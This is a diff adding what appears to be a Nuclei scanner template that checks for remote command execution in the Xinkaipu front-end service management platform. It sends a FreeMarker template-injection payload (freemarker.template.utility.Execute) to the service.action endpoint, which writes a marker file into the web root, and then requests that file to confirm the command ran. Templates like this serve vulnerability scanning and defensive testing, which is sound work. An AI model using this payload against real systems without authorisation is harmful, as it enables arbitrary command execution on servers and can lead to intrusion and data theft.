@@ -1,0 +1,45 @@
+id: poc-yaml-xkp-front-end-service-management-platform-service-action-rce
+info:
+  name: 新开普 前置服务管理平台 service.action 远程命令执行漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+
+variables:
+  t1: "{{md5('123')}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: "rce-command-injection"
+    raw:
+      - |
+        POST /service_transport/service.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo {{t1}} > ./webapps/ROOT/Test.txt\")}"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"_result":false'
+          - '"_code":99'
+
+  - id: "verify-test-file"
+    method: GET
+    path:
+      - "/Test.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t1}}"
